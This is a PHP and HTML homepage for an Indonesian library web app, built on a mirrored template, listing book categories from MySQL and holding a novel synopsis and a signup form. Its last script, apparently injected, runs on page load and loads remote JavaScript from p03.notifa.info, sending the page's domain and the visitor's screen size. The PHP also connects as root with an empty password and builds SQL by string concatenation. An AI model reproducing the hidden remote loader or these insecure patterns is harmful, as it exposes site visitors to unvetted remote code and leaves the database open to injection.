<?php 
$conn = mysqli_connect("localhost", "root", "", "perpustakaan");
$sql = "SELECT * FROM jenis_buku";
$result = $conn->query($sql);
?>
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from kodeforest.net/html/books/library/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 04:57:23 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Selamat Datang Di Perpustakaan</title>
    <!-- CUSTOM STYLE -->
    <link href="style.css" rel="stylesheet">
    <!-- THEME TYPO -->
    <link href="css/themetypo.css" rel="stylesheet">
    <!-- BOOTSTRAP -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <!-- COLOR FILE -->
    <link href="css/color.css" rel="stylesheet">
    <!-- FONT AWESOME -->
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <!-- BX SLIDER -->
    <link href="css/jquery.bxslider.css" rel="stylesheet">
    <!-- Boostrap Slider -->
    <link href="css/bootstrap-slider.css" rel="stylesheet">
    <!-- Widgets -->
    <link href="css/widget.css" rel="stylesheet">
    <!-- Owl Carusel -->
    <link href="css/owl.carousel.css" rel="stylesheet">
    <!-- responsive -->
    <link href="css/responsive.css" rel="stylesheet">
    <!-- Component -->
    <link href="js/dl-menu/component.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/bookblock.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<body>
    <div id="loader-wrapper">
        <div id="loader"></div>

        <div class="loader-section section-left"></div>
        <div class="loader-section section-right"></div>

    </div>
    <!--WRAPPER START-->
    <div class="wrapper kode-header-class-3">
        <!--HEADER START-->
        <header class="header-3">
            <div class="container">
                <div class="logo-container">
                    <div class="row">
                        <div class="col-md-3">
                            <!--LOGO START-->
                            <div class="logo">
                                <a href="#"><img src="images/logo-2.png" alt=""></a>
                            </div>
                            <!--LOGO END-->
                        </div>
                        <div class="col-md-9">
                            <div class="top-strip">
                                <div class="pull-left">
                                    <p>Selamat Datang di Peroustakaan Kami</p>
                                </div>
                                <div class="social-icon">
                                  
                                    <ul>
                                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        <li><a href="#"><i class="fa fa-linkedin"></i></a></li>                      
                                    </ul>

                                </div>
                                 <div class="kode-navigation">
                                <ul>
                                    <li><a href="index.php">Beranda</a>
                                        <ul>
                                            <li><a href="index.php">Tentang Perpustakaan</a></li>
                                        </ul>
                                    </li>

                                    <li><a href="admin/index.php">Admin</a></li>


                                    <li><a href="jenisbuku.php">Jenis Buku</a>
                                        <ul>
                                            <li><a href="books3-sidebar.html">Novel</a></li>
                                            <li><a href="books-detail.html">Pengetahuan</a></li>
                                            <li><a href="books-detail.html">Cerpen</a></li>
                                            <li><a href="books-detail.html">Komik</a></li>                                
                                        </ul>
                                    </li>
                                    <li><a href="anggota.php">Anggota</a>
                                        
                                    </li>
                                    <li><a href="peminjaman.php">Peminjaman</a>
                                        
                                    </li>
                                    <li class="last"><a href="pengembalian.php">Pengembalian</a>
                                        
                                    </li>



                                    <div id="kode-responsive-navigation" class="dl-menuwrapper">
                                        <button class="dl-trigger">Open Menu</button>
                                        <ul class="dl-menu">
                                            <li class="menu-item kode-parent-menu"><a href="index.php">Beranda</a>
                                                <ul class="dl-submenu">
                                                    <li><a href="index.php">Tentang Perpustakaan</a></li>
                                                </ul>
                                            </li>
                                            <li><a href="admin.php">Admin</a></li>
                                            <li class="menu-item kode-parent-menu"><a href="jenisbuku.php">Jenis Buku</a>
                                                <ul class="dl-submenu">
                                                    <li><a href="books3-sidebar.html">Novel</a></li>
                                                    <li><a href="books-detail.html">Pengetahuan</a></li>
                                                    <li><a href="books-detail.html">Cerpen</a></li>
                                                    <li><a href="books-detail.html">Komik</a></li>                                
                                                </ul>
                                            </li>
                                            <li class="menu-item kode-parent-menu"><a href="anggota.php">Anggota</a>
                                                
                                            </li>
                                            <li class="menu-item kode-parent-menu last"><a href="peminjaman.php">Peminjaman</a>
                                                
                                            </li>
                                            <li class="menu-item kode-parent-menu last"><a href="pengembalian.php">Pengembalian</a>

                                            </li>

                                        </div>
                                    </div>
                                </div>
                            </div>
                            </div>
                        </div>
                    </header>
                    <!--HEADER END-->
                    <!--BANNER START-->
                    <div class="kode-banner">
                        <ul class="bxslider">
                            <li>
                                <img src="images/banner-2.png" alt="">
                                <div class="kode-caption-2">
                                    <h5>Apakah Kamu Mencari Buku...?</h5>
                                    <h2>Di Perpustakaan terbesar</h2>
                                    <p>Selain itu, Anda juga dapat menemukan kesalahan saat ini untuk mengakses lebih lanjut, kemudian menambahkan semua yang Anda butuhkan.</p>
                                    <div class="caption-btns">
                                        <a href="#">Lihat Selengkapnya</a>
                                        <a href="#">Beli Sekarang</a>
                                    </div>                  
                                </div>
                            </li>

                            <li>
                                <img src="images/banner-2.png" alt="">
                                <div class="kode-caption-2">
                                    <h5>Apakah Kamu Mencari Buku...?</h5>
                                    <h2>Di Perpustakaan terbesar</h2>
                                    <p>Selain itu, Anda juga dapat menemukan kesalahan saat ini untuk mengakses lebih lanjut, kemudian menambahkan semua yang Anda butuhkan.</p>
                                    <div class="caption-btns">
                                        <a href="#">Lihat Selengkapnya</a>
                                        <a href="#">Beli Sekarang</a>
                                    </div>                  
                                </div>
                            </li>
                            
                            <li>
                                <img src="images/banner-3.png" alt="">
                                <div class="kode-caption-2">
                                    <h5>Apakah Kamu Mencari Buku...?</h5>
                                    <h2>Di Perpustakaan terbesar</h2>
                                    <p>Selain itu, Anda juga dapat menemukan kesalahan saat ini untuk mengakses lebih lanjut, kemudian menambahkan semua yang Anda butuhkan.p>
                                        <div class="caption-btns">
                                            <a href="#">Lihat Selengkapnya</a>
                                            <a href="#">Beli Sekarang</a>
                                        </div>                  
                                    </div>
                                </li>
                            </ul>
                        </div>
                        <!--BANNER END-->
                        <!--BUT NOW START-->
                        <div class="search-section">
                            <div class="container">



                                
                            </div>
                        </div>
                        <!--BUT NOW END-->
                        <!--CONTENT START-->
                        <div class="kode-content">

                            <!--BOOK GUIDE SECTION START-->
                            <section>
                                <div class="container">
                                    <!--SECTION CONTENT START-->
                                    <div class="section-heading-1">
                                        <h2>Selamat Datang DI Perpustakaan</h2>
                                        <p>Selamat datang di Perpustakaan Paling Populer Hari Ini</p>
                                        <div class="kode-icon"><i class="fa fa-book"></i></div>
                                    </div>
                                    <!--SECTION CONTENT END-->
                                    <div class="row">
                                        <div class="col-md-3 col-sm-6">
                                            <div class="kode-service-3">
                                                <i class="fa fa-gift"></i>
                                                <h3><a href="#">Buku Elektronik</a></h3>
                                                <p>versi elektronik dari buku cetak yang dapat dibaca di komputer.</p>
                                                <a href="#" class="read-more">Baca Selanjutnya</a>
                                            </div>
                                        </div>
                                        <div class="col-md-3 col-sm-6">
                                            <div class="kode-service-3">
                                                <i class="fa fa-book"></i>
                                                <h3><a href="#">buku audio</a></h3>
                                                <p>kaset audio atau rekaman CD dari pembacaan buku, biasanya novel.</p>
                                                <a href="#" class="read-more">Baca Selanjutnya</a>
                                            </div>
                                        </div>
                                        <div class="col-md-3 col-sm-6">
                                            <div class="kode-service-3">
                                                <i class="fa fa-clone"></i>
                                                <h3><a href="#">Majalah</a></h3>
                                                <p>publikasi berkala yang memuat artikel dan informasi ilustrasi.</p>
                                                <a href="#" class="read-more">Baca Selanjutnya</a>
                                            </div>
                                        </div>
                                        <div class="col-md-3 col-sm-6">
                                            <div class="kode-service-3">
                                                <i class="fa fa-calculator"></i>
                                                <h3><a href="#">Anak Anak</a></h3>
                                                <p> tahun-tahun usia seseorang dari 13 hingga 19 dan adalah anak-anak.</p>
                                                <a href="#" class="read-more">Baca Selanjutnya</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                            <!--BOOK GUIDE SECTION END-->
                            <!--TOP SELLERS SECTION START-->
                            <section class="lib-categories-section">
                                <div class="container">
                                    <!--SECTION CONTENT START-->
                                    <div class="section-heading-1 dark-sec">
                                        <h2>Kategori Utama Kami</h2>
                                        <p>Berikut adalah beberapa Kategori Utama dari Buku-Buku yang Tersedia.</p>
                                        <div class="kode-icon"><i class="fa fa-book"></i></div>
                                    </div>
                                    <!--SECTION CONTENT END-->
                                    <ul class="nav nav-tabs" role="tablist">

                                        <?php 
                                        foreach ($result as $r) { ?>
                                            <li role="presentation"><a href="#" role="tab" data-toggle="tab"><?php echo $r['jenis_buku'] ?></a></li>   
                                        <?php } ?>    
                                    </ul>

                                    <!-- Tab panes -->
                                    <div class="tab-content">
                                        <div role="tabpanel" class="tab-pane fade in active" id="Photography">
                                            <ul class="bxslider">
                                                <?php 
                                                    foreach ($result as $r) {?>
                                                        <li class="<?php echo $r['jenis_buku']; ?>">
                                                            <?php 
                                                            $jb = $r['jenis_buku'];
                                                            $buku = mysqli_query($conn,"SELECT * FROM buku WHERE jenis_buku = '".$jb."'");
                                                            while($b = mysqli_fetch_array($buku)){ ?>
                                                                
                                                            
                                                            <div class="col-md-3 col-sm-6 best-seller-pro">
                                                                <figure>
                                                                    <img src="images/<?php echo $b['sampul_buku'] ?>" alt=""width="100%" height="350px;">
                                                                </figure>
                                                                <div class="kode-text">
                                                                    <h3><?php echo $b['judul_buku'] ?></h3>
                                                                </div>
                                                                <div class="kode-caption">
                                                                    <h3><?php echo $b['judul_buku'] ?></h3>

                                                                    <a href="/<?php echo $b['link'] ?>" class="add-to-cart">Pinjam</a>
                                                                </div>
                                                            </div>
                                                            <?php }?>
                                                        </li>
                                                 <?php  } ?>

                                            </ul>

                                        </div>
                                    </div>
                                </div>
                            </section>
                            <!--TOP SELLERS SECTION END-->
                            <section>
                                <div class="container">
                                    <div class="section-heading-1">
                                        <h2>Buku Gratis Untuk Dibaca (Basis Teks)</h2>
                                        <p>Buku Paling Populer Hari Ini tersedia di Perpustakaan Kami</p>
                                        <div class="kode-icon"><i class="fa fa-book"></i></div>
                                    </div>
                                    <div class="bb-custom-wrapper">
                                        <div id="bb-bookblock" class="bb-bookblock">
                                            <div class="bb-item">
                                                <div class="bb-custom-side">
                                                    <h3>Cerita 1</h3>
                                                    <p>
                                                        Buku ini menceritakan kisah cinta dan perjuangan hidup seorang gadis bernama Lail, saat usia baru menginjak 13 tahun ia harus menjadi yatim piatu. Pada hari pertamanya sekolah, bencana gunung meletus dan gempa dahsyat telah menghancurkan kota tempat tinggalnya dan membunuh ibu serta ayahnya. Letusan gunung api purba yang melebihi letusan Gunung Tambora dan Gunung Krakatau. Beruntung ia diselamatkan oleh seorang anak berusia 15 tahun bernama Esok, ibu Esok tidak meninggal namun kedua kakinya terpaksa diamputasi.

Selama hampir satu tahun Lail dan Esok tinggal di pengungsian, mereka tidak terpisahkan, orang-orang mengenal Esok dan Lail. Mereka berdua juga membantu para petugas pengungsian. Hingga akhirnya pemerintah mengumumkan untuk menutup tempat pengungsian, hal ini membuat Esok dan Lail berpisah. Lail akan ditinggal di panti sosial sedangkan Esok ternyata di adopsi oleh salah satu keluarga. Tenyata di panti sosial Lail mendapat teman sekamar yang ceria, lucu dan penuh semangat bernama Maryam, Maryam memiliki rambut kribo yang halus. Di panti sosial terdapat beberapa peraturan yang harus dilaksanakan oleh Lail dan Maryam.
</p>
                                                </div>
                                                <div class="bb-custom-side">
                                                    <h3>Cerita 2</h3>
                                                    <p>Lail terkadang rindu pada Esok, hingga akhirnya mereka memiliki jadwal pertemuan rutin, hanya sebulan sekali, namun bagi Lail itu sudah lebih dari cukup. Mereka bertemu untuk berbagi cerita aktivitas mereka masing-masing. Sayangnya jadwal rutin itu harus berubah saat Esok harus melanjutkan pendidikannya di Ibu Kota, mereka hanya bisa bertemu saat liburan semester saja. Lail menyibukkan dirinya dengan aktivitas yang bermanfaatnya. Lail dan Maryam mendaftar diri dalam Organisasi Relawan dan mereka merupakan Relawan termuda, mereka juga mengukir prestasi salah satunya adalah mereka ditempatkan di sektor 2, dimana terdapat dua kota kembar di hulu dan hilir yang di pisahkan jarak 50km. Saat itu bendungan di hulu sungai retak dan apabila bendungan itu jebol akan menghancurkan dua kota kembar itu, hanya ada satu cara mencapai hilir saat itu yaitu berlari secepat mungkin menerjang badai. Mereka berdua berhasil memperingatkan kota itu dan jasa mereka ternyata membuat mereka memperoleh penghargaan.

Kesibukannya membuat Lail mampu mengalihkan rindunya. Esok selalu datang mengunjungi Lail dengan membawa sepeda merah yang dulu saat bencana selalu mereka pakai lengkap dengan topi yang Lail berikan. Esok datang tanpa terduga. Sayangnya intensitas pertemuan mereka semakin jarang. Mereka hanya dapat bertemu satu tahun sekali itupun kalau Esok tidak sibuk. Lail tidak pernah menghubungi Esok, dia terkadang bertanya kabar Esok pada Ibunya dan Esokpun demikian. Dan ternyata keluarga yang mengadopsi Esok adalah keluarga Wali Kota.</p>
                                                </div>
                                            </div>
                                            <div class="bb-item">
                                                <div class="bb-custom-side">
                                                    <h3>Cerita  3</h3>
                                                    <p>PaSingkat cerita ternyata Esok tengah mengerjakan sebuah kapal luar angkasa yang akan membawa penduduk bumi ke luar angkasa untuk menghindari bencana yang lebih besar dari gunung meletus, bencana itu adalah suhu bumi yang akan semakin lama semakin panas karena kerusakan stratosfer yang diakibatkan oleh keegoisan manusia. Sejak bencana gunung meletus, iklim di bumi tidak terkendali, para petinggi negara telah mengadakan KTT untuk memecahkan hal ini, namun para petinggi negara sub tropis dan tropis berlomba-lomba mengirimkan pesawat ulang-aling untuk menyemprotkan gas anti sulfur dioksida di lapisan stratosfer. Dalam jangka waktu yang singkat, hal ini membuat iklim berangsur pulih namun masalah baru muncul.

Kecerdasan Esok membuatnya terlibat dalam proyek pembuatan kapal ini. penduduk yang dapat pergi meninggalkan bumi juga tidak semua, mereka dipilih secara acak. Sayangnya Esok memiliki dua tiket dalam kapal tersebut, suatu ketika Wali Kota datang pada Lail, memintanya untuk memberikan tiket itu pada Claudia anak Wali Kota apabila Lail mendapatkan tiket itu dari Esok. Terjadi kesalahpahaman dalam hal ini. Lail tumbuh dewasa dan ia seperti mengerti perasaannya. Lail membutuhkan kepastian Esok, satu hari sebelum pengumuman resmi dari pemerintah, Lail sama sekali belum mendapat kabar dari Esok, perasaannya kalut. Hingga pada  detik-detik menjelang penerbangan kapal ini Lail justru memutuskan untuk masuk ke ruang modifikasi ingatan, Lail ingin menghilangkan semua bebannya, menghapusnya dari ingatannya.

</p>
                                                </div>
                                                <div class="bb-custom-side">
                                                    <h3>Cerita 4</h3>
                                                    <p> Esok yang ternyata tengah menjalani proses pemindahan data hingga tak bisa menghubungi Lail, tak dapat menghentikan proses operasi itu, sekalipun ia telah membuat banyak teknologi canggih diseluruh dunia, Esok terlambat untuk mencegah Lail melakukan hal itu. Esok tak ingin Lail melupakannya.Namun akhirnya pada detik-detik terakhir, sebelum alat modifikasi itu bekerja Lail memutuskan untuk memeluk erat semua kenangan menyakitkannya. Benang merah yang menandakan kenangan menyakitkan telah berubah menjadi benang berwarna biru. Lail tidak melupakan Esok. Hari itu juga pemerintah mengumukan penerbangan kapal luar angkasa itu, Lail dan Esok tetap tinggal di bumi bersama-sama, satu bulan kemudian mereka menikah. Elijah, fasilitator Lail diruang operasi mengerti bahwa bukan melupakan yang jadi masalahnya. Tapi menerima. Barangsiapa yang bisa menerima, maka dia akan bisa melupakan, hidup bahagia. Tapi jika dia tidak bisa menerima, dia tidak akan pernah bisa melupakan.</p>
                                                </div>
                                            </div>
                                           
                                            
                                           
                                        </div>

                                        <nav>
                                            <a id="bb-nav-prev" href="#" class="bb-custom-icon bb-custom-icon-arrow-left">Previous</a>
                                            <a id="bb-nav-next" href="#" class="bb-custom-icon bb-custom-icon-arrow-right">Next</a>
                                        </nav>
                                    </div>
                                </div>
                            </section>

                            <!--BECOME A MEMBER START-->
                            <section class="kode-membership">
                                <div class="container">
                                    <!--SECTION HEADING START-->
                                    <div class="section-heading-1 dark-sec">
                                        <h2>SILAHKAN DAFTAR</h2>
                                        <div class="kode-icon"><i class="fa fa-book"></i></div>
                                    </div>
                                    <!--SECTION HEADING END-->
                                    <div class="row" action="aksidaftar.php" method="post">
                                        <div class="col-md-4 col-sm-4">
                                            <div class="input-container">
                                                <i class="fa fa-envelope-o"></i>
                                                <input type="text" placeholder="nama">
                                            </div>
                                        </div>
                                        <div class="col-md-4 col-sm-4">
                                            <div class="input-container">
                                                <i class="fa fa-home"></i>
                                                <input type="text" placeholder="alamat">
                                            </div>
                                        </div>
                                        <div class="col-md-4 col-sm-4">
                                            <div class="input-container">
                                                <i class="fa fa-home"></i>
                                                <input type="text" placeholder="jeniskelamin">
                                            </div>
                                        </div>
                                        <div class="col-md-12 col-sm-12">
                                            <button type="submit" value="daftar">Daftar</button>
                                        </div>
                                    </div>
                                </div>
                            </section>


                            <footer class="footer-2">
                                <div class="container">
                                    <div class="lib-copyrights">
                                        <p>Copyrights © 2019. All rights reserved</p>
                                        <div class="social-icon">
                                            <ul>
                                                <li><a href="#" data-toggle="tooltip" title="Facebook"><i class="fa fa-facebook"></i></a></li>
                                                <li><a href="#" data-toggle="tooltip" title="Linkedin"><i class="fa fa-linkedin"></i></a></li>
                                                <li><a href="#" data-toggle="tooltip" title="Twitter"><i class="fa fa-twitter"></i></a></li>
                                                <li><a href="#" data-toggle="tooltip" title="Tumblr"><i class="fa fa-tumblr"></i></a></li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="back-to-top">
                                        <a href="#home"><i class="fa fa-angle-up"></i></a>
                                    </div>
                                </div>
                            </footer>
                        </div>
                        <!--WRAPPER END-->
                        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
                        <script src="js/jquery.min.js"></script>
                        <!-- Include all compiled plugins (below), or include individual files as needed -->
                        <script src="js/modernizr.custom.js"></script>
                        <script src="js/bootstrap.min.js"></script>
                        <script src="js/jquery.bxslider.min.js"></script>
                        <script src="js/bootstrap-slider.js"></script>
                        <script src="js/waypoints.min.js"></script> 
                        <script src="js/jquery.counterup.min.js"></script>
                        <script src="js/owl.carousel.js"></script>
                        <script src="js/dl-menu/jquery.dlmenu.js"></script>
                        <script type="text/javascript" src="lib/hash.js"></script>
                        <script type="text/javascript" src="lib/booklet-lib.js"></script>
                        <script src="js/jquerypp.custom.js"></script>
                        <script src="js/jquery.bookblock.js"></script>
                        <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=false"></script>
                        <script src="js/functions.js"></script>
                        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdy8hzAW7EupWL9qdaP3o2eA4Fl2DzSmxxZfLlYNG2KeHgfPNvnhIzWJ1KZodKXlO9NGNn50Wf2ri4YVMuV9wzTPj4UoQvbt%2b%2b0r9kEdtDz%2bXjp9Jkkz4NHNu7q5OZELOLiHug7CHz2OZfLKeN%2f%2b2pihWiu3YylRTf1l2c2Afry5vOX26GrDmqFEKk%2bzMcN5rcQBarhV%2b0p5iFT0oCk6613ZILIJsvRCyKPh04t9HLqS7ioLE0AJz69a25ArO2VpUjCCl3%2bB4QLe5b7sdvi0GSQQ7AQ6f0VMyTQ1Vh9k%2fie6PTRJ1tLIIWZDg3Ur7yyyRWERrdFekOCINNbzIoP%2bEVMUuyPqivdshqzk%2bcxMmTpotPgTEolZSE3AO%2fQ0BbBeJyaC9z2xqBdzE%2bzISOON%2fyFyNShw5qfCX4gBxfsUr34Eh1hxXpSCuAW7NuE9Zkh4DJPk8iBGJV06b1wGVtnyntLCrEMm1Xr9yXjVMICHPic10%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

                        <!-- Mirrored from kodeforest.net/html/books/library/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:03:52 GMT -->
                        </html>  